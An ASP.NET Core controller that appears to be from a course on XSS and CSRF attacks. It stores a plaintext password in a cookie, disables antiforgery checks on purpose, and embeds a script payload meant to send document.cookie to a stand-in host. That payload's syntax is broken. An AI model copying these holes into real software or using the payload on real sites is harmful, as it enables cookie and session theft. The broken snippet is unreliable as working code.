using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;

namespace Course.Attacks.XSS.Web.Controllers
{
    public class CommentController : Controller
    {
        public IActionResult CommentAdd()
        {
            HttpContext.Response.Cookies.Append("name", "ahmet");
            HttpContext.Response.Cookies.Append("password", "1234");
            return View();
        }
        //controller level disable CSRF token
        [IgnoreAntiforgeryToken]
        [HttpPost]
        public IActionResult CommentAdd(string name,string email,string comment)
        {

            ViewBag.name = name;
            ViewBag.comment = "<script> alert('alert') new Image().\"http://example.com/readCookie/?account=\"+document.cookie\"</script>";
            return View();
        }
    }
}
